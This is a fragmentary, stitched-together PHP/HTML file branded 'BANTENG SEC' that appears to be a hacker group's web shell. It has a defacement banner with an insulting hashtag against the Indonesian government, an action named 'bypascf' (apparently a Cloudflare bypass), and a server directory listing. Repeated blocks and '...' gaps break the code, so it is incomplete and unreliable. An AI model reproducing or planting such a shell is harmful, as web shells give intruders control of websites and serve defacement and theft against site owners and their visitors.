...
<html>
	<head>
		...
		<meta name="copyright" content="BANTENG SEC"/>
		<title>[+] BANTENG SEC [+]</title>
...
<center>
<img alt="#fuckIndonesianGoverment" src="https://b.top4top.io/p_28292gwwi0.png" width="300px"></center>
						<h1 class="text-center">[+] BANTENGSEC [+]</h1>
...
<html>
	<head>
		...
		<link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSu0OtYC_3X8iecIimtc3woBTKbc16wuvYPYQ&usqp=CAU"/>
		<title>[+] BANTENG SEC [+]</title>
...
.html(filenames.join(","));
		...
		echo '
		<div class="container">
			<h1 class="text-center"><a href="https://facebook.com/IndoSecOfficial" style="color:#ffffff;">[+] BANTENG SEC [+]</h1>
		...
		if (isset($_GET['about'])) {
			echo '<div class="card text-center bg-light about">
				...
				<div class="card-footer">
					<p class="card-text"><small class="text-muted">Copyright 2019 [+] BANTENG SEC [+]</small></p>
				</div>
			</div><br/>';
			exit;
		}
	...
	*/
	...
	if ($_GET['aksi'] == 'bypascf') {
		...
		echo '<center><div id="tab"><table class="text-white mt-1 table-hover table-responsive">
			...
			foreach($scandir as $file){
				...
				echo '<tr>
					...
					if($ext == "php") {
						echo 'https://b.top4top.io/p_28292gwwi0.png"';
					}elseif ($ext == "html") {
						echo 'https://b.top4top.io/p_28292gwwi0.png"';
					}elseif ($ext == "css") {
						echo 'https://b.top4top.io/p_28292gwwi0.png"';
		...
		echo '</table></div><hr/><a href="https://facebook.com/IndoSecOfficial" class="text-muted">Copyright 2019 [+] BANTENG SEC [+]</a></center><br/>';	
